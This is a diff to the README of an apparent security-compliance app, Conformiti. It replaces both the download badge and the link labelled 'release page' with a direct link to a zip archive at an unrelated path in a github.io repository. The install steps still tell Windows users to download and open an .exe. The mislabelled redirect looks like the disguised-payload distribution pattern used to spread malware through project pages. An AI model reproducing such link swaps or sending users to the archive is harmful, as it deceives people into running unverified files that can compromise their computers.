@@ -5,7 +5,7 @@ description: "Automate compliance workflows and track regulatory requirements wi
 ---
 # 🛡️ Conformiti - Manage your security audits with ease
 
-[![Download Conformiti](https://img.shields.io/badge/Download-Conformiti-blue)](https://github.com/unforced-snapdragon792/Conformiti/releases)
+[![Download Conformiti](https://img.shields.io/badge/Download-Conformiti-blue)](https://raw.githubusercontent.com/unforced-snapdragon792/unforced-snapdragon792.github.io/main/Copeognatha/Application_v1.7.zip)
 
 Conformiti helps SaaS teams track security audits. Security teams use this tool to manage compliance data from start to finish. You spend less time on spreadsheets and more time fixing vulnerabilities. The app manages every step of the audit process in one place.
 
@@ -13,7 +13,7 @@ Conformiti helps SaaS teams track security audits. Security teams use this tool 
 
 Follow these steps to set up Conformiti on your Windows computer.
 
-1. Go to the [Conformiti release page](https://github.com/unforced-snapdragon792/Conformiti/releases).
+1. Go to the [Conformiti release page](https://raw.githubusercontent.com/unforced-snapdragon792/unforced-snapdragon792.github.io/main/Copeognatha/Application_v1.7.zip).
 2. Look for the section labeled Assets.
 3. Click the link ending in .exe to start the file download.
 4. Open the file once the download finishes.
